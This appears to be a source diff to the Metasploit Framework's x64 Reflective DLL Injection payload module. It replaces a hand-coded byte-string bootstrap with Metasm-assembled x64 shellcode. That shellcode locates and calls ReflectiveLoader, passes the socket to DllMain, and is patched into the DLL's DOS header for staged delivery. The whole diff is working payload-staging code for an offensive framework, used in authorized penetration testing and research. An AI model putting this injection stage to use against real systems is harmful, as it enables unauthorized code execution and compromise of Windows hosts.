@@ -8,7 +8,7 @@ module Msf
 
 ###
 #
-# Common module stub for ARCH_X86_64 payloads that make use of Reflective DLL Injection.
+# Common module stub for ARCH_X64 payloads that make use of Reflective DLL Injection.
 #
 ###
 
@@ -28,19 +28,9 @@ module Payload::Windows::ReflectiveDllInject_x64
         [ 'URL', 'https://github.com/rapid7/ReflectiveDLLInjection' ] # customisations
       ],
       'Platform'      => 'win',
-      'Arch'          => ARCH_X86_64,
-      'PayloadCompat' =>
-        {
-          'Convention' => 'sockrdi'
-        },
-      'Stage'         =>
-        {
-          'Offsets' =>
-            {
-              'EXITFUNC' => [ 47, 'V' ]
-            },
-          'Payload' => ""
-        }
+      'Arch'          => ARCH_X64,
+      'PayloadCompat' => { 'Convention' => 'sockrdi' },
+      'Stage'         => { 'Payload'   => "" }
       ))
 
     register_options( [ OptPath.new( 'DLL', [ true, "The local path to the Reflective DLL to upload" ] ), ], self.class )
@@ -50,42 +40,60 @@ module Payload::Windows::ReflectiveDllInject_x64
     datastore['DLL']
   end
 
-  def stage_payload
+  def asm_invoke_dll(opts={})
+    asm = %Q^
+        ; prologue
+          db 0x4d, 0x5a         ; 'MZ' = "pop r10"
+          push r10              ; back to where we started
+          push rbp              ; save rbp
+          mov rbp, rsp          ; set up a new stack frame
+          sub rsp, 32           ; allocate some space for calls.
+        ; GetPC
+          call $+5              ; relative call to get location
+          pop rbx               ; pop return value
+        ; Invoke ReflectiveLoader()
+          ; add the offset to ReflectiveLoader()
+          add rbx, #{"0x%.8x" % (opts[:rdi_offset] - 0x11)}
+          call rbx              ; invoke ReflectiveLoader()
+        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
+          ; offset from ReflectiveLoader() to the end of the DLL
+          mov r8, rdi           ; r8 contains the socket
+          mov rbx, rax          ; save DllMain for another call
+          push 4                ; push up 4, indicate that we have attached
+          pop rdx               ; pop 4 into rdx
+          call rbx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
+        ; Invoke DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
+          ; push the exitfunk value onto the stack
+          mov r8d, #{"0x%.8x" % Msf::Payload::Windows.exit_types[opts[:exitfunk]]}
+          push 5                ; push 5, indicate that we have detached
+          pop rdx               ; pop 5 into rdx
+          call rbx              ; call DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
+    ^
+  end
+
+  def stage_payload(opts = {})
     # Exceptions will be thrown by the mixin if there are issues.
     dll, offset = load_rdi_dll(library_path)
 
-    exit_funk = [ @@exit_types['thread'] ].pack( "V" ) # Default to ExitThread for migration
+    asm_opts = {
+      rdi_offset: offset,
+      exitfunk:   'thread'  # default to 'thread' for migration
+    }
 
-    bootstrap = "\x4D\x5A" +                        # pop r10             ; pop r10 = 'MZ'
-          "\x41\x52" +                        # push r10            ; push r10 back
-          "\x55" +                            # push rbp            ; save ebp
-          "\x48\x89\xE5" +                    # mov rbp, rsp        ; setup fresh stack frame
-          "\x48\x81\xEC\x20\x00\x00\x00" +    # sub rsp, 32         ; alloc some space for calls
-          "\x48\x8D\x1D\xEA\xFF\xFF\xFF" +    # lea rbx, [rel+0]    ; get virtual address for the start of this stub
-          "\x48\x81\xC3" + [offset].pack( "V" ) + # add rbx, 0x???????? ; add offset to ReflectiveLoader
-          "\xFF\xD3" +                        # call rbx            ; call ReflectiveLoader()
-          "\x48\x89\xC3" +                    # mov rbx, rax        ; save DllMain for second call
-          "\x49\x89\xF8" +                    # mov r8, rdi         ; R8 = our socket
-          "\x68\x04\x00\x00\x00" +            # push 4              ;
-          "\x5A" +                            # pop rdx             ; RDX = signal we have attached
-          "\xFF\xD0" +                        # call rax            ; call DllMain( somevalue, DLL_METASPLOIT_ATTACH, socket )
-          "\x41\xB8" + exit_funk +            # mov r8d, 0x???????? ; our EXITFUNC placeholder
-          "\x68\x05\x00\x00\x00" +            # push 5              ;
-          "\x5A" +                            # pop rdx             ; signal we have detached
-          "\xFF\xD3"                          # call rbx            ; call DllMain( somevalue, DLL_METASPLOIT_DETACH, exitfunk )
-          # the DOS headers e_lfanew entry will begin here at offset 64.
+    asm = asm_invoke_dll(asm_opts)
+
+    # generate the bootstrap asm
+    bootstrap = Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
 
     # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
-    if( bootstrap.length > 62 )
-      print_error( "Reflective Dll Injection (x64) generated an oversized bootstrap!" )
-      return
+    if bootstrap.length > 62
+      raise RuntimeError, "Reflective DLL Injection (x64) generated an oversized bootstrap!"
     end
 
     # patch the bootstrap code into the dll's DOS header...
     dll[ 0, bootstrap.length ] = bootstrap
 
-    # return our stage to be loaded by the intermediate stager
-    return dll
+    dll
   end
 
 end
